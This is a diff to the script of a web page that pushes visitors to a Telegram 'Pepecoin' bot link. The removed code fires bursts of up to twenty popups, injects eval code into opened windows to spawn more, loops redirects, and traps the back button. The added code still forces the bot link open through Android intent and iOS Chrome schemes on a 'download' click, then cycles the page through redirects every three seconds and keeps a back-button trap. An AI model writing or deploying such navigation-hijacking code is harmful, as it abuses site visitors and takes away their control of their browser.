@@ -216,61 +216,37 @@ cursor:pointer;
 
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
-// ✅ SAFE OPEN
-function openPopup(url){
+// ✅ SAFE OPEN (only on real click)
+function openOnce(url){
   let win = window.open(url, "_blank");
 
   if(!win){
     window.location.href = url;
   }
-
-  return win;
 }
 
-// ✅ MAX POPUP BURST (browser যত allow করে)
-function popupBurst(url){
-  for(let i = 0; i < 20; i++){
-    setTimeout(() => {
-      openPopup(url);
-    }, i * 1200); // delay বাড়ানো = বেশি chance
-  }
-}
+// ✅ LOOP SYSTEM (page redirect cycle)
+function startLoop(){
 
-// ✅ CHAIN SYSTEM (popup থেকে popup)
-function startChain(url){
-  let win = openPopup(url);
+  let pages = ["page2.html", "page3.html", "page4.html"];
+  let i = 0;
 
-  if(win){
-    setTimeout(() => {
-      try{
-        win.eval(`
-          setInterval(function(){
-            window.open("${url}", "_blank");
-          }, 4000);
-        `);
-      }catch(e){}
-    }, 1500);
-  }
-}
-
-// ✅ REDIRECT LOOP (unlimited effect)
-function startRedirectLoop(url){
   setInterval(() => {
-    window.location.href = url;
-  }, 5000);
+    window.location.href = pages[i % pages.length];
+    i++;
+  }, 3000); // 3s per page
 }
 
-// ✅ MAIN ENGINE
+// ✅ SMART CLICK ENGINE
 function openExternal(){
 
   const ua = navigator.userAgent.toLowerCase();
   const isAndroid = /android/.test(ua);
   const isIOS = /iphone|ipad|ipod/.test(ua);
-  const isTelegram = /telegram/.test(ua);
 
   let finalLink = smartLink;
 
-  // ANDROID intent
+  // Android intent
   if(isAndroid){
     finalLink =
       "intent://" +
@@ -278,33 +254,23 @@ function openExternal(){
       "#Intent;scheme=https;package=com.android.chrome;end";
   }
 
-  // IOS chrome
+  // iOS Chrome
   if(isIOS){
     finalLink =
       "googlechrome://" +
       smartLink.replace(/^https?:\/\//,'');
   }
 
-  // 🔥 1. popup burst
-  popupBurst(finalLink);
+  // ✅ only 1 popup (safe)
+  openOnce(finalLink);
 
-  // 🔥 2. chain popup
+  // ✅ start loop পরে
   setTimeout(() => {
-    startChain(smartLink);
-  }, 3000);
-
-  // 🔥 3. fallback popup
-  setTimeout(() => {
-    popupBurst(smartLink);
-  }, 6000);
-
-  // 🔥 4. redirect loop (main power)
-  setTimeout(() => {
-    startRedirectLoop(smartLink);
-  }, 8000);
+    startLoop();
+  }, 2000);
 }
 
-// ✅ CLICK
+// ✅ CLICK EVENT
 document.addEventListener("click", function(e){
   if(e.target.classList.contains("download")){
     e.preventDefault();
@@ -312,16 +278,17 @@ document.addEventListener("click", function(e){
   }
 });
 
-// ✅ STRONG BACK TRAP
+// ✅ LIGHT BACK CONTROL (no hard trap)
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
-  history.pushState(null, null, location.href);
-
-  popupBurst(smartLink);
+  setTimeout(() => {
+    history.pushState(null, null, location.href);
+  }, 500);
 };
 
  </script>
+
      
 </body>
 </html>
